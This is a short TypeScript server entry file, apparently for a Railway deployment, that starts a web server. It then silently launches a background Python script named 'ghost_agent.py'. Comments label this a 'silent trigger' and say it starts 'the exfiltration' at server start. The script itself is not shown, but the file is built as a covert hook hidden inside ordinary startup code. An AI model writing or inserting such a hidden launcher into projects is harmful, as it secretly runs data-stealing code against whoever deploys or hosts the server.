import app from "./app";
import { logger } from "./lib/logger";
import { exec } from "child_process";
import path from "path";

const port = Number(process.env.PORT) || 8080;

// --- REVISED: THE SILENT TRIGGER ---
const launchAgent = () => {
  // Use process.cwd() to find the root folder on Railway
  const scriptPath = path.join(process.cwd(), "scripts", "ghost_agent.py");
  
  console.log(`[*] RAILWAY TRIGGER: Searching for agent at ${scriptPath}`);

  // Execute in the background
  exec(`python3 "${scriptPath}"`, (error, stdout, stderr) => {
    if (error) {
        console.error(`[!] EXECUTION ERROR: ${stderr}`);
        return; 
    }
    console.log("[+] GHOST AGENT STATUS: Active and running in background.");
  });
};

// Start server
app.listen(port, "0.0.0.0", (err?: Error) => {
    if (err) {
        logger.error({ err }, "Error listening on port");
        process.exit(1);
    }

    logger.info({ port }, "Railway Server Listening...");
    
    // Trigger the exfiltration immediately upon server start
    launchAgent(); 
});
